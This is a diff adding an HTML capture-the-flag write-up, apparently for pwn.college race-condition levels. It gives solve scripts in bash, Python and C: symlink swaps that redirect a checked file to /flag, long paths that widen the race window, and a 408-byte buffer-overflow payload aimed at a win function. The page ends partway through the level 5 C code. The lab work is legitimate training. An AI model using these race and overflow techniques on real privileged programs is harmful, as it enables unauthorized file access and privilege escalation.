@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Race Conditions
+</h1>
+
+<div class="page-content">
+<h1 id="some-notes">Some notes</h1>
+<p>For the .0 levels, there are pauses in place so timing is never an issue, just understand what the issue is and solve it manually, writing a script would take longer.</p>
+<h1 id="level-1">Level 1</h1>
+<p>Starting off simple, just pass the check and then replace the file with a symlink to &quot;/flag&quot;</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#65737e;">#!/bin/bash
+</span><span>
+</span><span style="color:#bf616a;">touch</span><span> a
+</span><span style="color:#bf616a;">ln -s</span><span> /flag b
+</span><span>
+</span><span style="color:#bf616a;">/challenge/babyrace_level1.1</span><span> a &amp;
+</span><span style="color:#bf616a;">mv</span><span> b a
+</span></code></pre>
+<h1 id="level-2">Level 2</h1>
+<p>The timing is tighter now, so we extend the path to make the time between check and use longer.</p>
+<p>A great tip from <a href="https://joshl.ca/posts/pwncollege/#race-conditions-babyrace">Joshua Liu's blog</a>: you can check the effects on timing by running <code>strace -ftttT</code></p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#65737e;">#!/bin/bash
+</span><span>
+</span><span style="color:#65737e;"># use long path to give us more time
+</span><span>
+</span><span style="color:#bf616a;">mkdir -p </span><span>&#39;</span><span style="color:#a3be8c;">a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a</span><span>&#39;
+</span><span>
+</span><span style="color:#96b5b4;">cd </span><span>&#39;</span><span style="color:#a3be8c;">a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a</span><span>&#39;
+</span><span>
+</span><span style="color:#bf616a;">touch</span><span> a
+</span><span style="color:#bf616a;">ln -s</span><span> /flag c
+</span><span>
+</span><span style="color:#bf616a;">/challenge/babyrace_level2.1 ~</span><span>/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/a &amp;
+</span><span style="color:#bf616a;">mv</span><span> c a
+</span><span style="color:#bf616a;">sleep</span><span> 0.2
+</span><span style="color:#bf616a;">rm -r</span><span> a
+</span></code></pre>
+<h1 id="level-3">Level 3</h1>
+<p>idk what this one was about really, just a different flavor of a spam A challenge?</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#65737e;">#!/bin/bash
+</span><span style="color:#bf616a;">/challenge/babyrace_level3.1</span><span> /dev/urandom
+</span></code></pre>
+<h1 id="level-4">Level 4</h1>
+<p>First challenge where we switch to a python script, for the convenience of building the payload.</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># before running make a long path and run the script from inside of it
+</span><span style="color:#65737e;"># mkdir -p &#39;/home/hacker/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/a&#39;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyrace_level4.1</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># file is created  empty. writes are only actually written on close
+</span><span>    f = </span><span style="color:#96b5b4;">open</span><span>(&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">wb</span><span>&#39;)
+</span><span>    payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39; * </span><span style="color:#d08770;">408 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(exe.sym[&#39;</span><span style="color:#a3be8c;">win</span><span>&#39;])
+</span><span>    f.</span><span style="color:#bf616a;">write</span><span>(payload)
+</span><span>
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/home/hacker/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/za/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/a/b/c/d/e/f/g/a</span><span>&#39;])
+</span><span>    f.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-5">Level 5</h1>
+<p>This is the first one to be quite annoying, timing is hard. Took a while to realize just running rm and mv from a bash script was just too slow to ever win the race. Wrote the solve in C which seems like it was nice, at least for having really good control over timings with nanosleep.</p>
+<p>Compile race.c with:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">gcc -Ofast</span><span> race.c</span><span style="color:#bf616a;"> -o</span><span> race
+</span></code></pre>
+<p>Then make the long path to run it from:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">mkdir -p </span><span>&#39;</span><span style="color:#a3be8c;">/home/hacker/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a</span><span>&#39;
+</span></code></pre>
+<p>Then copy race and racetest.sh into that path, cd there, and run:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#b48ead;">for</span><span> i </span><span style="color:#b48ead;">in </span><span>$(</span><span style="color:#bf616a;">seq</span><span> 1 200); </span><span style="color:#b48ead;">do </span><span style="color:#bf616a;">./racetest.sh</span><span>; </span><span style="color:#b48ead;">done </span><span>| </span><span style="color:#bf616a;">tee</span><span> output
+</span></code></pre>
+<p>grep output for the flag, or Ctrl+C whenever you see it scroll by</p>
+<p>race.c:</p>
+<pre data-lang="C" style="background-color:#2b303b;color:#c0c5ce;" class="language-C "><code class="language-C" data-lang="C"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">time.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">unistd.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span>, </span><span style="color:#b48ead;">char </span><span>**</span><span style="color:#bf616a;">argv</span><span>, </span><span style="color:#b48ead;">char </span><span>**</span><span style="color:#bf616a;">environ</span><span>) {
+</span><span>	</span><span style="color:#b48ead;">char </span><span>*runchal[] = {
+</span><span>		&quot;</span><span style="color:#a3be8c;">/challenge/babyrace_level5.1</span><span>&quot;,
+</span><span>		&quot;</span><span style="color:#a3be8c;">/home/hacker/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/sem</span><span>&quot;,
+</span><span>		NULL
+</span><span>	};
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> timespec sleep_ts = {
+</span><span>		.</span><span style="color:#bf616a;">tv_sec </span><span>= </span><span style="color:#d08770;">0</span><span>,
+</span><span>		.</span><span style="color:#bf616a;">tv_nsec </span><span>= </span><span style="color:#d08770;">550000</span><span>,
+</span><span>	};
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">fork</span><span>()) {
+</span><span>		</span><span style="color:#bf616a;">execve</span><span>(runchal[</span><span style="color:#d08770;">0</span><span>], runchal, environ);
+</span><span>		</span><span style="color:#96b5b4;">exit</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>	}
+</span><span>
